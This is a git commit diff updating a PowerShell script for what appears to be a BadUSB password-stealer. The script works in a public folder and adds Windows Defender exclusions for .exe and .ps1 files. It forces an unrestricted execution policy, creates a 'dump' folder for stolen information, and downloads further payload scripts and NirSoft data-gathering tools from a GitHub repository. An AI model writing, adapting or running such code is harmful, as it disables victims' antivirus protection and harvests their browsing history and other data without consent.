1af7dc6aaee8ebfd79e188152e8f0d80c6813f6d
idontknow-CC <2sob.3r0th3rcc@gmail.com>
2024-09-08 19:04:24 +0700

    Update ciaoV2_upload.ps1

--- ciaoV2_upload.ps1
+++ ciaoV2_upload.ps1
@@ -6,7 +6,9 @@
 #  |___/                                        
 Set-Location C:\Users\Public\Documents #Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-mkdir dump #Create dump/ directory to put all informations that we'll steal in it
+Add-MpPreference -ExclusionExtension ps1 -Force
+Set-ExecutionPolicy unrestricted -Force
+New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory #Create dump/ directory to put all informations that we'll steal in it
 Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
